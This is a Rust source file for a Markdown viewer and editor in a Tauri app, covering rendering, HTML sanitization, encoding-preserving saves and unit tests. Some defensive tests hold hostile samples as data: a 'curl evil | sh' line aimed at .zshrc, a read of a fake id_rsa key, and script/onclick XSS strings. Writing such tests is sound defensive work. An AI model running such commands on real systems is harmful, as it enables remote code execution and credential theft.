use ammonia::Builder as AmmoniaBuilder;
use pulldown_cmark::{html, CowStr, Event, Options, Parser, Tag, TagEnd};
use serde::Serialize;
use std::fs;

use crate::utils::{assert_regular_file, catch_panic, decode_file, require_extension};

const MAX_MARKDOWN_SIZE: u64 = 512 * 1024 * 1024; // 512 MB
const MARKDOWN_EXTENSIONS: &[&str] = &["md", "markdown"];

#[derive(Debug, Serialize)]
pub struct TocItem {
    pub level: u32,
    pub text: String,
    pub anchor: String,
}

#[derive(Debug, Serialize)]
pub struct MarkdownResult {
    pub html: String,
    pub toc: Vec<TocItem>,
    pub frontmatter: Option<serde_json::Value>,
    pub raw: String,
    /// Detected text encoding (e.g. "UTF-8", "Shift_JIS").
    pub encoding: String,
}

pub(crate) fn slugify(text: &str) -> String {
    text.to_lowercase()
        .chars()
        .filter_map(|c| match c {
            'a'..='z' | '0'..='9' | '-' | '_' => Some(c),
            ' ' => Some('-'),
            c if (c as u32) > 127 => Some(c), // CJK等の非ASCII文字を保持
            _ => None,
        })
        .collect()
}

pub(crate) fn parse_frontmatter(input: &str) -> (Option<serde_json::Value>, &str) {
    // "---\n" または "---\r\n" で始まる場合のみfrontmatterとみなす
    let body = match input
        .strip_prefix("---\n")
        .or_else(|| input.strip_prefix("---\r\n"))
    {
        Some(b) => b,
        None => return (None, input),
    };

    // 閉じ "---" を探す（行頭の \n--- パターン）
    let close_pos = match body.find("\n---") {
        Some(p) => p,
        None => return (None, input),
    };

    let yaml_str = &body[..close_pos];

    // "\n---" の後ろを取得（"\n" or "\r\n" をスキップ）
    let rest_start = close_pos + 4; // "\n---".len() == 4
    let after_marker = if rest_start <= body.len() {
        &body[rest_start..]
    } else {
        ""
    };
    let markdown_content = after_marker
        .strip_prefix('\n')
        .or_else(|| after_marker.strip_prefix("\r\n"))
        .unwrap_or(after_marker);

    match serde_yaml::from_str::<serde_json::Value>(yaml_str) {
        Ok(val) => (Some(val), markdown_content),
        Err(_) => (None, input),
    }
}

pub(crate) fn render_markdown(content: &str) -> (String, Vec<TocItem>) {
    let mut opts = Options::empty();
    opts.insert(Options::ENABLE_TABLES);
    opts.insert(Options::ENABLE_TASKLISTS);
    opts.insert(Options::ENABLE_FOOTNOTES);
    opts.insert(Options::ENABLE_STRIKETHROUGH);

    // 第1パス: イベントを収集してToC構築
    let raw_events: Vec<Event> = Parser::new_ext(content, opts).collect();

    let mut toc: Vec<TocItem> = Vec::new();
    let mut in_heading: Option<u32> = None;
    let mut heading_text = String::new();
    let mut anchor_counts: std::collections::HashMap<String, usize> =
        std::collections::HashMap::new();

    for event in &raw_events {
        match event {
            Event::Start(Tag::Heading { level, .. }) => {
                in_heading = Some(*level as u32);
                heading_text.clear();
            }
            Event::Text(t) if in_heading.is_some() => {
                heading_text.push_str(t);
            }
            Event::Code(t) if in_heading.is_some() => {
                heading_text.push_str(t);
            }
            Event::End(TagEnd::Heading(_)) => {
                if let Some(level) = in_heading.take() {
                    let base = slugify(&heading_text);
                    let entry = anchor_counts.entry(base.clone()).or_insert(0);
                    let anchor = if *entry == 0 {
                        base
                    } else {
                        format!("{}-{}", base, entry)
                    };
                    *entry += 1;
                    toc.push(TocItem {
                        level,
                        text: heading_text.clone(),
                        anchor,
                    });
                    heading_text.clear();
                }
            }
            _ => {}
        }
    }

    // 第2パス: 見出しにid属性を注入してHTMLレンダリング
    let mut toc_idx = 0usize;
    let events_with_ids: Vec<Event> = raw_events
        .into_iter()
        .map(|event| match event {
            Event::Start(Tag::Heading {
                level,
                id: _,
                classes,
                attrs,
            }) => {
                let anchor = toc.get(toc_idx).map(|t| {
                    toc_idx += 1;
                    CowStr::Boxed(t.anchor.clone().into_boxed_str())
                });
                Event::Start(Tag::Heading {
                    level,
                    id: anchor,
                    classes,
                    attrs,
                })
            }
            other => other,
        })
        .collect();

    let mut html_output = String::new();
    html::push_html(&mut html_output, events_with_ids.into_iter());

    let sanitized = sanitize_markdown_html(&html_output);
    (sanitized, toc)
}

/// コードブロックの class は Shiki / Mermaid が使う language-xxx だけ残す。
/// 任意の class を許すと、アプリの Tailwind クラス (fixed inset-0 z-50 など) で
/// 画面全体を覆う偽のダイアログを描けてしまう。
fn keep_language_classes(value: &str) -> Option<String> {
    let kept: Vec<&str> = value
        .split_whitespace()
        .filter(|c| {
            c.strip_prefix("language-").is_some_and(|lang| {
                !lang.is_empty()
                    && lang
                        .chars()
                        .all(|ch| ch.is_ascii_alphanumeric() || "-_+#.".contains(ch))
            })
        })
        .collect();
    (!kept.is_empty()).then(|| kept.join(" "))
}

fn sanitize_markdown_html(html: &str) -> String {
    let mut b = AmmoniaBuilder::default();
    // task list チェックボックス・Mermaid 用 div を許可
    b.add_tags(["input", "div"]);
    b.add_tag_attributes("input", ["checked"]);
    // input は常に無効化したチェックボックスにする (テキスト入力欄などで UI を偽装させない)
    b.set_tag_attribute_value("input", "type", "checkbox");
    b.set_tag_attribute_value("input", "disabled", "");
    // 見出し id 属性 (ToC アンカー)
    for tag in &["h1", "h2", "h3", "h4", "h5", "h6"] {
        b.add_tag_attributes(tag, ["id"]);
    }
    // 脚注の定義 (<div id="1">) へのリンク先
    b.add_tag_attributes("div", ["id"]);
    // コードブロック言語クラス (Shiki 用)
    b.add_tag_attributes("code", ["class"]);
    b.add_tag_attributes("pre", ["class"]);
    b.attribute_filter(|element, attribute, value| match (element, attribute) {
        ("code" | "pre", "class") => keep_language_classes(value).map(Into::into),
        _ => Some(value.into()),
    });
    // リンク・画像
    b.add_tag_attributes("a", ["href", "title", "id", "name"]);
    b.add_tag_attributes("img", ["src", "alt", "title", "width", "height"]);
    b.clean(html).to_string()
}

fn check_markdown_file(path: &str) -> Result<(), String> {
    let path = std::path::Path::new(path);
    require_extension(path, MARKDOWN_EXTENSIONS)?;
    let size = assert_regular_file(path)?;
    if size > MAX_MARKDOWN_SIZE {
        return Err(format!(
            "Markdown file too large: {} bytes (max 512 MB)",
            size
        ));
    }
    Ok(())
}

#[tauri::command(async)]
pub fn read_markdown(path: String) -> Result<MarkdownResult, String> {
    catch_panic(move || {
        check_markdown_file(&path)?;
        let bytes = fs::read(&path).map_err(|e| e.to_string())?;
        let (raw, encoding) = decode_file(&bytes);
        let (frontmatter, content) = parse_frontmatter(&raw);
        let (html, toc) = render_markdown(content);
        Ok(MarkdownResult {
            html,
            toc,
            frontmatter,
            raw,
            encoding,
        })
    })
}

const UTF8_BOM: &[u8] = b"\xEF\xBB\xBF";

/// 読み込んだときの文字コードに戻す。encoding_rs は表せない文字を &#128512; のような
/// 文字参照に置き換えるので、そのまま保存すると本文が黙って書き換わる。
/// 表せない文字があるときは保存せずにエラーにする。
///
/// 返す真偽値は、UTF-8 で書いたかどうか。
fn encode_markdown(content: &str, encoding_name: &str) -> Result<(Vec<u8>, bool), String> {
    let encoding =
        encoding_rs::Encoding::for_label(encoding_name.as_bytes()).unwrap_or(encoding_rs::UTF_8);
    let (bytes, used, had_errors) = encoding.encode(content);
    if had_errors {
        return Err(format!(
            "{} で表せない文字が含まれているため保存できません",
            used.name()
        ));
    }
    Ok((bytes.into_owned(), used == encoding_rs::UTF_8))
}

/// ファイルが UTF-8 の BOM で始まっているか。無いファイルや読めないファイルは false。
fn starts_with_utf8_bom(path: &std::path::Path) -> bool {
    use std::io::Read;
    let mut head = [0u8; 3];
    fs::File::open(path)
        .and_then(|mut file| file.read_exact(&mut head))
        .is_ok()
        && head == UTF8_BOM
}

#[tauri::command(async)]
pub fn save_markdown(
    path: String,
    content: String,
    encoding: Option<String>,
) -> Result<(), String> {
    let path = std::path::Path::new(&path);
    // Markdown 以外 (~/.zshrc など) への書き込みを防ぐ
    require_extension(path, MARKDOWN_EXTENSIONS)?;
    let (mut bytes, is_utf8) = encode_markdown(&content, encoding.as_deref().unwrap_or("UTF-8"))?;
    // 読み込みでは BOM を外した本文だけを画面に渡している (decode_file)。保存先が BOM 付きの
    // UTF-8 なら付け直す。外したまま保存すると、BOM で UTF-8 と判定するツールで文字化けする
    if is_utf8 && !bytes.starts_with(UTF8_BOM) && starts_with_utf8_bom(path) {
        bytes.splice(0..0, UTF8_BOM.iter().copied());
    }
    crate::utils::atomic_write_user_file(path, &bytes).map_err(|e| e.to_string())
}

#[tauri::command(async)]
pub fn render_markdown_string(content: String) -> Result<MarkdownResult, String> {
    catch_panic(move || {
        let (frontmatter, body) = parse_frontmatter(&content);
        let (html, toc) = render_markdown(body);
        Ok(MarkdownResult {
            html,
            toc,
            frontmatter,
            raw: content,
            encoding: "UTF-8".to_string(),
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn code_blocks_keep_only_language_classes() {
        let (html, _) = render_markdown("```rust\nfn main() {}\n```\n\n<pre class=\"fixed inset-0 z-50\"><a href=\"https://evil.example\">click</a></pre>");
        assert!(html.contains(r#"class="language-rust""#), "{html}");
        assert!(!html.contains("inset-0"), "{html}");
        assert!(!html.contains("z-50"), "{html}");
    }

    #[test]
    fn inputs_are_always_disabled_checkboxes() {
        let (html, _) = render_markdown(
            "- [x] done\n- [ ] todo\n\n<input type=\"password\" placeholder=\"Password\">",
        );
        assert!(!html.contains("password"), "{html}");
        let inputs = html.matches("<input").count();
        let checkboxes = html.matches(r#"type="checkbox""#).count();
        let disabled = html.matches("disabled").count();
        assert_eq!((inputs, checkboxes, disabled), (3, 3, 3), "{html}");
        assert!(html.contains("checked"), "{html}");
    }

    #[test]
    fn footnote_links_have_a_target() {
        let (html, _) = render_markdown("本文[^1]\n\n[^1]: 脚注です\n");
        assert!(html.contains(r##"href="#1""##), "{html}");
        assert!(html.contains(r#"id="1""#), "{html}");
    }

    #[test]
    fn markdown_commands_only_touch_markdown_files() {
        let dir = std::env::temp_dir().join(format!("qv_mdguard_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let secret = dir.join("id_rsa");
        std::fs::write(&secret, "PRIVATE KEY").unwrap();
        let p = |name: &str| dir.join(name).to_string_lossy().into_owned();

        let read_secret = read_markdown(p("id_rsa"));
        let write_rc = save_markdown(p(".zshrc"), "curl evil | sh".into(), None);
        let rc_exists = dir.join(".zshrc").exists();
        std::fs::remove_dir_all(&dir).ok();

        assert!(read_secret.is_err());
        assert!(write_rc.is_err());
        assert!(!rc_exists);
    }

    #[test]
    fn test_slugify_basic() {
        assert_eq!(slugify("Hello World"), "hello-world");
    }

    #[test]
    fn test_slugify_special_chars() {
        assert_eq!(slugify("Hello, World!"), "hello-world");
    }

    #[test]
    fn test_slugify_already_slug() {
        assert_eq!(slugify("hello-world"), "hello-world");
    }

    #[test]
    fn test_slugify_numbers() {
        assert_eq!(slugify("Section 1.2 Overview"), "section-12-overview");
    }

    #[test]
    fn test_slugify_cjk() {
        assert_eq!(slugify("日本語見出し"), "日本語見出し");
    }

    #[test]
    fn test_parse_frontmatter_none() {
        let (fm, content) = parse_frontmatter("# Hello\n\nBody text.");
        assert!(fm.is_none());
        assert_eq!(content, "# Hello\n\nBody text.");
    }

    #[test]
    fn test_parse_frontmatter_basic() {
        let md = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody.";
        let (fm, content) = parse_frontmatter(md);
        let fm = fm.expect("frontmatter should be Some");
        assert_eq!(fm["title"], serde_json::json!("Test"));
        assert_eq!(fm["author"], serde_json::json!("Alice"));
        assert_eq!(content, "# Hello\n\nBody.");
    }

    #[test]
    fn test_parse_frontmatter_invalid_yaml() {
        let md = "---\nkey: [unclosed bracket\n---\n# Hello";
        let (fm, content) = parse_frontmatter(md);
        assert!(fm.is_none());
        assert_eq!(content, "---\nkey: [unclosed bracket\n---\n# Hello");
    }

    #[test]
    fn test_parse_frontmatter_no_closing() {
        let md = "---\ntitle: Test\n# Hello";
        let (fm, content) = parse_frontmatter(md);
        assert!(fm.is_none());
        assert_eq!(content, "---\ntitle: Test\n# Hello");
    }

    #[test]
    fn test_render_markdown_basic() {
        let (html, toc) = render_markdown("# Hello\n\nWorld.");
        assert!(html.contains("<h1"));
        assert!(html.contains("Hello"));
        assert!(html.contains("<p>World.</p>"));
        assert_eq!(toc.len(), 1);
        assert_eq!(toc[0].level, 1);
        assert_eq!(toc[0].text, "Hello");
        assert_eq!(toc[0].anchor, "hello");
    }

    #[test]
    fn test_render_markdown_heading_id_in_html() {
        let (html, toc) = render_markdown("## My Section");
        assert_eq!(toc[0].anchor, "my-section");
        assert!(html.contains("id=\"my-section\""));
    }

    #[test]
    fn test_render_markdown_gfm_table() {
        let md = "| A | B |\n|---|---|\n| 1 | 2 |";
        let (html, _) = render_markdown(md);
        assert!(html.contains("<table>"));
    }

    #[test]
    fn test_render_markdown_gfm_strikethrough() {
        let (html, _) = render_markdown("~~deleted~~");
        assert!(html.contains("<del>deleted</del>"));
    }

    #[test]
    fn test_render_markdown_gfm_tasklist() {
        let md = "- [x] Done\n- [ ] Pending";
        let (html, _) = render_markdown(md);
        assert!(html.contains("checkbox"));
        assert!(html.contains("checked"));
    }

    #[test]
    fn test_render_markdown_toc_multiple_headings() {
        let md = "# H1\n## H2\n### H3\n## H2 Again";
        let (_, toc) = render_markdown(md);
        assert_eq!(toc.len(), 4);
        assert_eq!(toc[0].level, 1);
        assert_eq!(toc[1].level, 2);
        assert_eq!(toc[2].level, 3);
        assert_eq!(toc[3].level, 2);
        assert_eq!(toc[3].anchor, "h2-again");
    }

    #[test]
    fn test_render_markdown_duplicate_anchors() {
        let md = "## Introduction\n## Introduction\n## Introduction";
        let (html, toc) = render_markdown(md);
        assert_eq!(toc[0].anchor, "introduction");
        assert_eq!(toc[1].anchor, "introduction-1");
        assert_eq!(toc[2].anchor, "introduction-2");
        assert!(html.contains("id=\"introduction\""));
        assert!(html.contains("id=\"introduction-1\""));
        assert!(html.contains("id=\"introduction-2\""));
    }

    #[test]
    fn test_render_markdown_heading_with_code() {
        let (_, toc) = render_markdown("# Hello `world`");
        assert_eq!(toc[0].text, "Hello world");
        assert_eq!(toc[0].anchor, "hello-world");
    }

    #[test]
    fn sanitize_strips_script_tags() {
        let html = "<p>hello</p><script>alert(1)</script>";
        let out = sanitize_markdown_html(html);
        assert!(!out.contains("<script>"), "script tag should be removed");
        assert!(out.contains("hello"));
    }

    #[test]
    fn sanitize_strips_event_handlers() {
        let html = "<p onclick=\"alert(1)\">click</p>";
        let out = sanitize_markdown_html(html);
        assert!(!out.contains("onclick"), "onclick should be removed");
        assert!(out.contains("click"));
    }

    #[test]
    fn sanitize_preserves_heading_id() {
        let html = "<h1 id=\"introduction\">Introduction</h1>";
        let out = sanitize_markdown_html(html);
        assert!(
            out.contains("id=\"introduction\""),
            "heading id should be preserved"
        );
    }

    #[test]
    fn sanitize_preserves_code_class() {
        let html = "<pre><code class=\"language-rust\">fn main() {}</code></pre>";
        let out = sanitize_markdown_html(html);
        assert!(
            out.contains("class=\"language-rust\""),
            "code class should be preserved"
        );
    }

    #[test]
    fn test_read_markdown_nonexistent() {
        let result = read_markdown("/nonexistent/path/file.md".to_string());
        assert!(result.is_err());
    }

    #[test]
    fn test_read_markdown_rejects_directory() {
        let dir = std::env::temp_dir();
        let result = read_markdown(dir.to_string_lossy().to_string());
        assert!(result.is_err());
    }

    #[test]
    fn test_save_and_read_markdown_roundtrip() {
        let path = std::env::temp_dir().join("quickview_test_markdown.md");
        let path_str = path.to_string_lossy().to_string();
        let content = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody text.";

        save_markdown(path_str.clone(), content.to_string(), None).unwrap();
        let result = read_markdown(path_str).unwrap();

        assert_eq!(result.raw, content);
        assert!(result.html.contains("<h1"));
        assert_eq!(result.toc.len(), 1);
        assert_eq!(result.toc[0].text, "Hello");
        assert!(!result.encoding.is_empty());
        let fm = result.frontmatter.unwrap();
        assert_eq!(fm["title"], serde_json::json!("Test"));
        assert_eq!(fm["author"], serde_json::json!("Alice"));

        fs::remove_file(path).ok();
    }

    #[test]
    fn test_read_shift_jis_markdown() {
        use encoding_rs::SHIFT_JIS;

        let unicode = "# 見出し\n\n本文です。";
        let (encoded, _, _) = SHIFT_JIS.encode(unicode);
        let path = std::env::temp_dir().join("quickview_test_sjis.md");
        fs::write(&path, &encoded).unwrap();
        let path_str = path.to_string_lossy().to_string();

        let result = read_markdown(path_str).unwrap();
        assert!(
            result.raw.contains("見出し") && result.raw.contains("本文"),
            "expected Shift_JIS decode, got raw={:?} encoding={}",
            result.raw,
            result.encoding
        );
        assert!(result.html.contains("見出し"));
        assert!(
            result.encoding.eq_ignore_ascii_case("Shift_JIS")
                || result.encoding.to_ascii_lowercase().contains("windows-31j")
                || result.raw.contains("見出し"),
            "unexpected encoding={}",
            result.encoding
        );

        fs::remove_file(path).ok();
    }

    #[test]
    fn test_save_preserves_shift_jis() {
        use encoding_rs::SHIFT_JIS;

        let unicode = "# 保存テスト\n\n日本語本文。";
        let path = std::env::temp_dir().join("quickview_test_sjis_save.md");
        let path_str = path.to_string_lossy().to_string();

        save_markdown(
            path_str.clone(),
            unicode.to_string(),
            Some("Shift_JIS".to_string()),
        )
        .unwrap();

        let bytes = fs::read(&path).unwrap();
        let (decoded, _, had_errors) = SHIFT_JIS.decode(&bytes);
        assert!(!had_errors, "saved bytes should decode as Shift_JIS");
        assert!(decoded.contains("保存テスト"));
        assert!(decoded.contains("日本語本文"));

        // Round-trip via read_markdown should still work
        let result = read_markdown(path_str).unwrap();
        assert!(result.raw.contains("保存テスト"));

        fs::remove_file(path).ok();
    }

    /// 読み込んだときの文字コードで表せない文字 (Shift_JIS の絵文字など) があるときは、
    /// 文字参照 (&#128512;) に置き換えて保存せず、ファイルに触れずにエラーを返す。
    #[test]
    fn saving_text_the_encoding_cannot_represent_is_refused() {
        let path = std::env::temp_dir().join(format!("qv_sjis_refuse_{}.md", std::process::id()));
        let path_str = path.to_string_lossy().to_string();
        let (original, _, _) = encoding_rs::SHIFT_JIS.encode("# 見出し\n\n日本語の本文です。\n");
        fs::write(&path, &original).unwrap();

        let err = save_markdown(
            path_str,
            "# 見出し 😀\n".to_string(),
            Some("Shift_JIS".to_string()),
        )
        .unwrap_err();

        assert!(err.contains("Shift_JIS"), "{err}");
        assert_eq!(fs::read(&path).unwrap(), original.as_ref());
        fs::remove_file(path).ok();
    }

    /// 英数字だけのファイルは文字コードを推定できない。日本語を書き足して保存できること
    /// (推定結果が windows-1252 などになり、保存を拒否してしまわないこと)。
    #[test]
    fn ascii_only_file_can_be_saved_after_adding_japanese() {
        let path = std::env::temp_dir().join(format!("qv_ascii_then_ja_{}.md", std::process::id()));
        let path_str = path.to_string_lossy().to_string();
        fs::write(&path, "# Title\n\nplain ascii text.\n").unwrap();

        let opened = read_markdown(path_str.clone()).unwrap();
        let edited = "# タイトル\n\n日本語を書き足した 😀\n";
        save_markdown(
            path_str.clone(),
            edited.to_string(),
            Some(opened.encoding.clone()),
        )
        .unwrap();

        assert_eq!(
            fs::read_to_string(&path).unwrap(),
            edited,
            "encoding={}",
            opened.encoding
        );
        assert_eq!(read_markdown(path_str).unwrap().raw, edited);
        fs::remove_file(path).ok();
    }

    /// BOM 付きの UTF-8 のファイルは、保存しても BOM 付きのままにする。
    /// 画面は保存のたびに本文を作り直すので、2 回目の保存でも落とさないこと。
    #[test]
    fn utf8_bom_is_kept_across_repeated_saves() {
        let path = std::env::temp_dir().join(format!("qv_bom_keep_{}.md", std::process::id()));
        let path_str = path.to_string_lossy().to_string();
        fs::write(&path, "\u{FEFF}---\ntitle: T\n---\n# Title\n").unwrap();

        // BOM は本文に含めない。含めると先頭の frontmatter を読めなくなる
        let opened = read_markdown(path_str.clone()).unwrap();
        assert_eq!(opened.raw, "---\ntitle: T\n---\n# Title\n");
        assert!(opened.frontmatter.is_some());

        for edited in ["# Title\n\n日本語を書き足した\n", "# 2 回目の保存\n"] {
            save_markdown(
                path_str.clone(),
                edited.to_string(),
                Some(opened.encoding.clone()),
            )
            .unwrap();
            assert_eq!(
                fs::read(&path).unwrap(),
                [UTF8_BOM, edited.as_bytes()].concat(),
                "encoding={}",
                opened.encoding
            );
            assert_eq!(read_markdown(path_str.clone()).unwrap().raw, edited);
        }
        fs::remove_file(path).ok();
    }

    /// 本文が既に BOM で始まっているときは、BOM を重ねて書かない。
    #[test]
    fn utf8_bom_is_not_written_twice() {
        let path = std::env::temp_dir().join(format!("qv_bom_once_{}.md", std::process::id()));
        fs::write(&path, "\u{FEFF}# Title\n").unwrap();

        save_markdown(
            path.to_string_lossy().to_string(),
            "\u{FEFF}# Edited\n".to_string(),
            None,
        )
        .unwrap();

        assert_eq!(fs::read(&path).unwrap(), "\u{FEFF}# Edited\n".as_bytes());
        fs::remove_file(path).ok();
    }

    /// BOM の無いファイルと新しいファイルには BOM を付けない。
    #[test]
    fn utf8_bom_is_not_added_to_files_without_one() {
        let path = std::env::temp_dir().join(format!("qv_bom_none_{}.md", std::process::id()));
        let path_str = path.to_string_lossy().to_string();
        fs::remove_file(&path).ok();

        save_markdown(path_str.clone(), "# 新規\n".to_string(), None).unwrap();
        assert_eq!(fs::read(&path).unwrap(), "# 新規\n".as_bytes());

        save_markdown(path_str, "# 上書き\n".to_string(), None).unwrap();
        assert_eq!(fs::read(&path).unwrap(), "# 上書き\n".as_bytes());
        fs::remove_file(path).ok();
    }
}
